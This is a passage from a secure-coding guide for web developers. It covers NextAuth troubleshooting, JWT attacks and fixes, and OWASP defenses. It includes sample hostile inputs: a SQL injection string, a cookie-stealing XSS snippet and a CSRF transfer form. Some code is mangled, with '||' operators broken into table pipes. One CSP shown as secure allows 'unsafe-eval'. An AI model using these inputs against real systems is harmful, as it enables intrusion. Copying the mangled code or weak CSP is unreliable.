// OR: openssl rand -base64 32

```text

### Cause 2: Missing NEXTAUTH_URL in Production

```typescript
// ? VIBE: NextAuth defaults to localhost in production
// Result: Cookies set for localhost, not your domain

// ? TITAN: Set NEXTAUTH_URL to your production URL
// NEXTAUTH_URL = https://your-app.com

// For Vercel: Automatically inferred, but set it anyway
// For other providers: REQUIRED

```text

### Cause 3: Credentials Provider + Database Adapter Conflict

```typescript
// ? VIBE: Using Credentials Provider with PrismaAdapter
import { PrismaAdapter } from "@auth/prisma-adapter";
import CredentialsProvider from "next-auth/providers/credentials";

export const authOptions = {
adapter: PrismaAdapter(prisma),  // Database sessions by default
providers: [
CredentialsProvider({ // Requires JWT sessions!
// ...
    })
  ]
// CONFLICT: Credentials Provider needs JWT, Adapter uses DB sessions
};

// ? TITAN: Explicitly enable JWT sessions
export const authOptions = {
adapter: PrismaAdapter(prisma),
session: {
strategy: "jwt"  // REQUIRED for Credentials Provider
  },
providers: [
    CredentialsProvider({
// ...
    })
  ]
};

```text

### Cause 4: useSession Not Updating After Login

```typescript
// ? VIBE: Login succeeds but UI doesn't update
async function handleLogin() {
const result = await signIn('credentials', {
    email,
    password
  });
// User logged in, but useSession still returns null
}

// ? TITAN: Set redirect: false, then manually update
import { useSession, signIn } from "next-auth/react";
import { useRouter } from "next/navigation";

function LoginForm() {
const { update } = useSession();
const router = useRouter();

async function handleLogin() {
const result = await signIn('credentials', {
      email,
      password,
redirect: false  // Don't auto-redirect
    });

if (result?.ok) {
await update();  // Force session refresh
router.push('/dashboard'); // Manual redirect
    }
  }
}

```text

---

## CALLBACK ERRORS

### OAuth Callback URL Mismatch

```yaml
Error: OAUTH_CALLBACK_HANDLER_ERROR
Message: "The redirect_uri does not match the registered callback URL"

```text

### Fix

```typescript
// In OAuth Provider Dashboard (Google, GitHub, etc.)
// Authorized redirect URIs MUST be exact:

// ? CORRECT:
// https://your-app.com/api/auth/callback/google
// https://your-app.com/api/auth/callback/github

// ? WRONG (trailing slash):
// https://your-app.com/api/auth/callback/google/

// ? WRONG (http instead of https):
// http://your-app.com/api/auth/callback/google

// ? WRONG (www subdomain):
// https://www.your-app.com/api/auth/callback/google

```text

### File Name Case Sensitivity

```yaml
Error: MISSING_NEXTAUTH_API_ROUTE_ERROR

```text

### Fix

```bash

## ? WRONG: [...nextAuth].ts (capital A)

## ? CORRECT: [...nextauth].ts (lowercase)

## Git might not track case-only changes!

## Force rename

git mv 'pages/api/auth/[...nextAuth].ts' 'pages/api/auth/[...nextauth-temp].ts'
git mv 'pages/api/auth/[...nextauth-temp].ts' 'pages/api/auth/[...nextauth].ts'

```text

---

## CALLBACK CONFIGURATION FOR CUSTOM DATA

```typescript
// ? TITAN: Complete callback configuration
export const authOptions: NextAuthOptions = {
providers: [
    GoogleProvider({
clientId: process.env.GOOGLE_CLIENT_ID!,
clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
    }),
    CredentialsProvider({
credentials: {
email: { label: "Email", type: "email" },
password: { label: "Password", type: "password" }
      },
async authorize(credentials) {
const user = await prisma.user.findUnique({
where: { email: credentials?.email }
        });

| if (!user |  | !await bcrypt.compare(credentials!.password, user.password)) { |
return null;
        }

// Return user object - this becomes token.user
return {
id: user.id,
email: user.email,
name: user.name,
role: user.role  // Custom field
        };
      }
    })
  ],

callbacks: {
// Step 1: JWT callback - runs on sign in and on every request
async jwt({ token, user, trigger, session }) {
// User is defined only on sign in
if (user) {
token.id = user.id;
token.role = user.role;
      }

// Handle session update
if (trigger === "update" && session) {
token.name = session.name;
      }

return token;
    },

// Step 2: Session callback - runs when session is checked
async session({ session, token }) {
// Pass custom fields to session
if (session.user) {
session.user.id = token.id as string;
session.user.role = token.role as string;
      }
return session;
    }
  },

session: {
strategy: "jwt",
maxAge: 30 * 24 * 60 * 60  // 30 days
  },

pages: {
signIn: '/auth/login',
error: '/auth/error'
  }
};

// TypeScript: Extend types for custom fields
declare module "next-auth" {
interface Session {
user: {
id: string;
role: string;
} & DefaultSession["user"];
  }

interface User {
role: string;
  }
}

declare module "next-auth/jwt" {
interface JWT {
id: string;
role: string;
  }
}

```text

---

## DECISION TREE: NEXTAUTH TROUBLESHOOTING

```text
NEXTAUTH ISSUE

+- Session doesn't persist after login?
+- Check NEXTAUTH_SECRET is set in production
+- Check NEXTAUTH_URL matches your domain
+- Using Credentials + DB Adapter? ? Set session: { strategy: "jwt" }
+- Check cookies are being set (DevTools ? Application ? Cookies)

+- OAuth callback error?
+- Check callback URL in provider dashboard (exact match, no trailing slash)
+- Check clientId/clientSecret are correct
+- Check file name is lowercase: [...nextauth].ts

+- Custom user data not in session?
+- Add data in jwt callback: token.customField = user.customField
+- Add data in session callback: session.user.customField = token.customField

+- useSession returns null?
+- Is SessionProvider wrapping your app in layout.tsx?
+- Using Credentials Provider? ? Use redirect: false + update()
+- Check you're not calling on server (use auth() for server components)

+- Works locally, fails in production?
+- Check all environment variables are set in production
+- Enable debug: true temporarily to see logs
+- Check Vercel/server logs for errors

```text

---

## PRODUCTION CHECKLIST

```python
Before Deploying NextAuth:

[ ] NEXTAUTH_SECRET set (not from .env.local)
[ ] NEXTAUTH_URL set to production URL
[ ] OAuth callback URLs registered exactly
[ ] clientId/clientSecret set in production env
[ ] session.strategy matches your adapter usage
[ ] Credentials Provider has strategy: "jwt"
[ ] TypeScript types extended for custom fields
[ ] SessionProvider wraps _app.tsx or layout.tsx
[ ] Auth middleware protects correct routes

```text

---

### END OF NEXTAUTH.JS REAL PRODUCTION ISSUES

---

## VOLUME 7: REAL 2024 JWT SECURITY PATTERNS

## Source: Security Research, CVEs, Production Experience

> ?? **This is REAL authentication security knowledge from production apps.**

---

## JWT VULNERABILITIES

### Algorithm Confusion Attack (Most Common)

```text
Attacker changes "alg": "RS256" to "alg": "HS256"
Server uses PUBLIC key as HMAC secret.
Attacker signs with public key ? Valid token!

```text

### Real Fix: Whitelist Algorithms

```typescript
// ? VIBE: Trust whatever algorithm is in token
jwt.verify(token, publicKey);  // Attacker controls algorithm!

// ? TITAN: Explicitly specify algorithm
jwt.verify(token, publicKey, { algorithms: ['RS256'] });

// Even better: Use jose library with explicit key types
import { jwtVerify } from 'jose';

const { payload } = await jwtVerify(token, publicKey, {
algorithms: ['RS256'],
issuer: 'https://your-auth-server.com',
audience: 'your-app'
});

```text

### "none" Algorithm Attack

```text
Attacker sets "alg": "none"
Server accepts token without signature!

```text

### Real Fix

```typescript
// Always reject 'none' algorithm
const decoded = jwt.verify(token, secret, {
algorithms: ['HS256', 'RS256'],  // Explicit whitelist, never 'none'
});

```text

---

## REFRESH TOKEN ROTATION

### The Problem

```text
Access token stolen ? Attacker has access for token lifetime
Refresh token stolen ? Attacker has indefinite access!

```text

### Real Fix: Rotate on Every Use

```typescript
// Database schema
// refresh_tokens: { id, userId, token, familyId, usedAt, revokedAt }

async function refreshAccessToken(refreshToken: string) {
// 1. Find the refresh token
const storedToken = await db.refreshToken.findUnique({
where: { token: refreshToken }
  });

if (!storedToken) {
throw new Error('Invalid refresh token');
  }

// 2. Check if already used (REUSE DETECTION)
if (storedToken.usedAt) {
// Token reuse detected! Possible theft
// Revoke ENTIRE family of tokens
await db.refreshToken.updateMany({
where: { familyId: storedToken.familyId },
data: { revokedAt: new Date() }
    });

// Alert security team
await alertSecurityTeam(storedToken.userId, 'Refresh token reuse detected');

throw new Error('Security alert: Token reuse detected');
  }

// 3. Mark current token as used
await db.refreshToken.update({
where: { id: storedToken.id },
data: { usedAt: new Date() }
  });

// 4. Create NEW refresh token (rotation)
const newRefreshToken = await db.refreshToken.create({
data: {
userId: storedToken.userId,
familyId: storedToken.familyId,  // Same family for reuse detection
token: generateSecureToken(),
expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)  // 7 days
    }
  });

// 5. Create new access token
const accessToken = jwt.sign(
{ userId: storedToken.userId },
    process.env.JWT_SECRET,
{ expiresIn: '15m' }  // Short-lived!
  );

return {
    accessToken,
refreshToken: newRefreshToken.token
  };
}

```text

---

## SECURE TOKEN STORAGE

```typescript
// For Web Applications

// ? VIBE: localStorage (XSS vulnerable)
localStorage.setItem('accessToken', token);
// JavaScript can read this ? XSS can steal it

// ? VIBE: sessionStorage (XSS vulnerable)
sessionStorage.setItem('accessToken', token);

// ? TITAN: HttpOnly cookies (XSS protected)
// Server sets cookie
res.cookie('accessToken', accessToken, {
httpOnly: true,   // JavaScript cannot read
secure: true,  // HTTPS only
sameSite: 'lax',  // CSRF protection
maxAge: 15 * 60 * 1000,  // 15 minutes
path: '/'
});

res.cookie('refreshToken', refreshToken, {
httpOnly: true,
secure: true,
sameSite: 'strict',  // More restrictive for refresh
maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
path: '/api/auth/refresh'  // Only sent to refresh endpoint
});

```text

---

## TOKEN LIFETIME BEST PRACTICES

```typescript
const TOKEN_CONFIG = {
// Access Token: Used for API calls
accessToken: {
lifetime: '15m',  // Short! 15 minutes max
// If stolen, attacker has limited window
  },

// Refresh Token: Used to get new access tokens
refreshToken: {
lifetime: '7d',  // Longer, but not indefinite
// Should rotate on each use
// Should be revocable (stored in DB)
  },

// Remember-me: Optional longer session
rememberMeToken: {
lifetime: '30d',
// User explicitly opted in
// Still rotates and is revocable
  },
};

```text

---

## LOGOUT PROPERLY

```typescript
// ? VIBE: Just delete local token
function logout() {
localStorage.removeItem('token'); // Token still valid on server!
}

// ? TITAN: Server-side invalidation
async function logout(req, res) {
const refreshToken = req.cookies.refreshToken;

// 1. Revoke all refresh tokens for this family/session
if (refreshToken) {
const token = await db.refreshToken.findUnique({
where: { token: refreshToken }
    });

if (token) {
await db.refreshToken.updateMany({
where: { familyId: token.familyId },
data: { revokedAt: new Date() }
      });
    }
  }

// 2. Clear cookies
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');

// 3. For stateless JWT access tokens, consider:
// - Very short lifetimes (15 min)
// - Token blacklist (with TTL matching token expiry)

res.json({ success: true });
}

```text

---

## DECISION TREE: JWT DEBUGGING

```text
JWT ISSUE

+- Token rejected as invalid?
+- Check expiration (exp claim)
+- Check signature with correct key/algorithm
+- Check issuer and audience claims
+- Verify token hasn't been revoked

+- Algorithm confusion vulnerability?
+- Explicitly whitelist algorithms
+- Never accept 'none'
+- Use typed key objects (jose library)

+- Token stolen/compromised?
+- Rotate refresh tokens immediately
+- Revoke token family
+- Force re-authentication
+- Alert security team

+- Session not persisting?
+- Check cookie settings (httpOnly, secure, sameSite)
+- Check domain and path settings
+- Check CORS credentials configuration

+- Logout not working?
+- Clear cookies on client
+- Revoke refresh tokens on server
+- Consider token blacklist for access tokens

```text

---

## JWT SECURITY CHECKLIST

```typescript
const jwtSecurityChecklist = {
// Signing
algorithm: 'RS256 or ES256 (asymmetric)',  // Not HS256 with weak secret
secretKey: 'At least 256 bits, from secure vault',

// Claims
expiration: 'Access: 15 min, Refresh: 7 days',
issuer: 'Validate iss claim',
audience: 'Validate aud claim',

// Storage
accessToken: 'HttpOnly cookie or memory only',
refreshToken: 'HttpOnly cookie, /api/auth path only',
neverStore: 'Never in localStorage for auth tokens',

// Rotation
refreshRotation: 'New token on every use',
reuseDetection: 'Revoke family if reused',

// Logout
serverSideRevocation: 'Revoke refresh tokens',
cookieClearing: 'Clear all auth cookies',

// Additional
https: 'Always HTTPS in production',
cors: 'credentials: include with specific origins',
};

```text

---

### END OF JWT REAL SECURITY PATTERNS

---

## VOLUME 8: REAL OWASP SECURITY PATTERNS 2024

## Source: OWASP Top 10, Production Experience, Security Research

> ?? **This is REAL security knowledge - vulnerabilities = data breaches.**

---

## SQL INJECTION PREVENTION

```typescript
// ? VIBE: String concatenation = SQL Injection!
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Attacker input: ' OR '1'='1
// Result: SELECT * FROM users WHERE email = '' OR '1'='1'
// Returns ALL users!

// ? TITAN: Parameterized queries
// Prisma (automatic protection)
const user = await prisma.user.findUnique({
where: { email }  // Safe - Prisma escapes automatically
});

// Raw SQL with parameterized query
const user = await prisma.$queryRaw`
SELECT * FROM users WHERE email = ${email}
`; // Safe - parameterized

// Node.js with pg
const { rows } = await pool.query(
'SELECT * FROM users WHERE email = $1',
  [email]
); // Safe - parameterized

```text

---

## XSS PREVENTION

```typescript
// ? VIBE: Rendering user input directly
function Comment({ content }) {
return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
// Attacker input: <script>stealCookies()</script>

// ? TITAN: React auto-escapes by default
function Comment({ content }) {
return <div>{content}</div>;  // Safe - auto-escaped
}

// If HTML is REQUIRED, sanitize first
import DOMPurify from 'dompurify';

function RichContent({ html }) {
const sanitized = DOMPurify.sanitize(html, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
ALLOWED_ATTR: ['href']
  });
return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Content Security Policy (additional layer)
// next.config.js
module.exports = {
async headers() {
return [{
source: '/(.*)',
headers: [{
key: 'Content-Security-Policy',
value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
      }]
    }];
  }
};

```text

---

## CSRF PREVENTION

```typescript
// ? VIBE: No CSRF protection
<form action="/api/transfer" method="POST">
<input name="amount" value="1000">
<input name="to" value="attacker">
</form>
// Attacker can embed this form and trick user to submit

// ? TITAN: Anti-CSRF token
// Server: Generate token
import crypto from 'crypto';

function generateCsrfToken(req) {
const token = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = token;
return token;
}

// Client: Include in forms
<form action="/api/transfer" method="POST">
<input type="hidden" name="_csrf" value={csrfToken}>
<input name="amount" value="1000">
  <button>Transfer</button>
</form>

// Server: Validate
function validateCsrf(req) {
| const token = req.body._csrf |  | req.headers['x-csrf-token']; |
if (token !== req.session.csrfToken) {
throw new Error('Invalid CSRF token');
  }
}

// ? EVEN BETTER: SameSite Cookies
// Session cookie with SameSite protection
res.cookie('session', sessionId, {
httpOnly: true,
secure: true,
sameSite: 'lax'  // or 'strict' for max protection
});
// Browser won't send cookie with cross-site requests!

```text

---

## SECURE HEADERS

```typescript
// Essential security headers
// middleware.ts (Next.js)
export function middleware(request: NextRequest) {
const response = NextResponse.next();

// Prevent clickjacking
response.headers.set('X-Frame-Options', 'DENY');

// Prevent MIME sniffing
response.headers.set('X-Content-Type-Options', 'nosniff');

// Enable XSS filter (legacy browsers)
response.headers.set('X-XSS-Protection', '1; mode=block');

// Control referrer information
response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

// HTTPS only
response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

return response;
}

```text

---

## INPUT VALIDATION

```typescript
import { z } from 'zod';

// ? TITAN: Validate ALL user input
const userSchema = z.object({
email: z.string().email(),
password: z.string().min(8).max(128),
name: z.string().min(1).max(100),
age: z.number().int().min(0).max(150).optional(),
});

async function createUser(req, res) {
// Validate input
const result = userSchema.safeParse(req.body);

if (!result.success) {
return res.status(400).json({
error: 'Validation failed',
details: result.error.issues
    });
  }

// Use validated data
const user = await db.user.create({
data: result.data
  });

return res.json(user);
}

// For file uploads
const fileSchema = z.object({
mimetype: z.enum(['image/jpeg', 'image/png', 'image/webp']),
size: z.number().max(5 * 1024 * 1024),  // 5MB max
});

```text

---

## DECISION TREE: SECURITY AUDIT

```text
SECURITY CHECK

+- User input?
+- Validate with Zod/Joi
+- Escape HTML for display
+- Parameterize SQL queries
+- Sanitize file uploads

+- Authentication?
+- Use battle-tested library (NextAuth, Auth0)
+- Secure password hashing (bcrypt, argon2)
+- Rate limit login attempts
+- Implement MFA for sensitive accounts

+- Session management?
+- HttpOnly cookies
+- Secure flag (HTTPS only)
+- SameSite=Lax or Strict
+- Short expiration + rotation

+- API security?
+- CORS configured correctly
+- Rate limiting in place
+- Input validation
+- Proper error handling (no stack traces)

+- Headers?
+- CSP configured
+- X-Frame-Options
+- HSTS enabled
+- Referrer-Policy set

```text

---

### END OF OWASP SECURITY PATTERNS

---

## REAL INPUT VALIDATION PATTERNS 2024

## SQL Injection Prevention

```typescript
// NEVER do this
const query = `SELECT * FROM users WHERE id = ${userId}`;

// DO this - parameterized queries
const result = await db.query(
'SELECT * FROM users WHERE id = $1',
  [userId]
);

// With Prisma ORM (safe by default)
const user = await prisma.user.findUnique({
where: { id: userId }
});

// Input validation before database
const userIdSchema = z.string().uuid();
const validatedId = userIdSchema.parse(userId);

```text

---

## XSS Prevention

```typescript
// React auto-escapes by default
function SafeComponent({ userContent }: { userContent: string }) {
return <div>{userContent}</div>; // Safe - auto-escaped
}

// DANGER: dangerouslySetInnerHTML
function UnsafeComponent({ html }: { html: string }) {
// Only use with trusted/sanitized content
return <div dangerouslySetInnerHTML={{ __html: html }} />; // DANGER
}

// Sanitize if you must render HTML
import DOMPurify from 'dompurify';

function SanitizedHTML({ html }: { html: string }) {
const cleanHtml = DOMPurify.sanitize(html, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

// Content Security Policy header
// next.config.js
const securityHeaders = [
  {
key: 'Content-Security-Policy',
value: `
default-src 'self';
script-src 'self' 'unsafe-eval' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' blob: data:;
font-src 'self';
connect-src 'self' https://api.example.com;
`.replace(/\s+/g, ' ').trim()
  }
];

```text

---

## CSRF Protection

```typescript
// csrf.ts - CSRF token generation and validation
import { randomBytes, createHmac } from 'crypto';

const SECRET = process.env.CSRF_SECRET!;

function generateCsrfToken(sessionId: string): string {
const timestamp = Date.now().toString(36);
const random = randomBytes(16).toString('hex');
const payload = `${sessionId}.${timestamp}.${random}`;
const signature = createHmac('sha256', SECRET)
    .update(payload)
    .digest('hex');

return `${payload}.${signature}`;
}

function validateCsrfToken(token: string, sessionId: string): boolean {
const parts = token.split('.');
if (parts.length !== 4) return false;

const [tokenSession, timestamp, random, signature] = parts;

if (tokenSession !== sessionId) return false;

// Check token age (1 hour max)
const tokenAge = Date.now() - parseInt(timestamp, 36);
if (tokenAge > 3600000) return false;

const payload = `${tokenSession}.${timestamp}.${random}`;
const expectedSig = createHmac('sha256', SECRET)
    .update(payload)
    .digest('hex');

return signature === expectedSig;
}

// Middleware
function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
const token = req.headers['x-csrf-token'] as string;
const sessionId = req.session?.id;

| if (!token |  | !sessionId |  | !validateCsrfToken(token, sessionId)) { |
return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
}

```text

---

## Password Hashing

```typescript
import { hash, verify } from '@node-rs/argon2';

// Hash password on registration
async function hashPassword(password: string): Promise<string> {
return hash(password, {
memoryCost: 65536, // 64 MB
timeCost: 3,
parallelism: 4,
outputLen: 32,
  });
}

// Verify password on login
async function verifyPassword(
password: string,
hashedPassword: string
): Promise<boolean> {
try {
return await verify(hashedPassword, password);
} catch {
return false;
  }
}

// Password strength validation
const passwordSchema = z
  .string()
.min(8, 'Password must be at least 8 characters')
  .max(100)
.regex(/[A-Z]/, 'Password must contain an uppercase letter')
.regex(/[a-z]/, 'Password must contain a lowercase letter')
.regex(/[0-9]/, 'Password must contain a number')
.regex(/[^A-Za-z0-9]/, 'Password must contain a special character');

```text

---

## API Key Security

```typescript
import { randomBytes, createHash } from 'crypto';

// Generate API key
function generateApiKey(): { key: string; hash: string } {
const key = `sk_live_${randomBytes(24).toString('base64url')}`;
const hash = createHash('sha256').update(key).digest('hex');

return { key, hash }; // Store hash in DB, return key to user once
}

// Validate API key
| async function validateApiKey(key: string): Promise<User | null> { |
const hash = createHash('sha256').update(key).digest('hex');

const apiKey = await db.apiKey.findUnique({
where: { hash },
include: { user: true },
  });

| if (!apiKey |  | apiKey.revoked) return null; |

// Update last used
await db.apiKey.update({
where: { id: apiKey.id },
data: { lastUsedAt: new Date() },
  });

return apiKey.user;
}

// API key middleware
async function apiKeyAuth(req: Request, res: Response, next: NextFunction) {
const authHeader = req.headers.authorization;

if (!authHeader?.startsWith('Bearer ')) {
return res.status(401).json({ error: 'Missing API key' });
  }

const key = authHeader.slice(7);
const user = await validateApiKey(key);

if (!user) {
return res.status(401).json({ error: 'Invalid API key' });
  }

req.user = user;
  next();
}

```text

---

### END OF SECURITY PATTERNS

```text
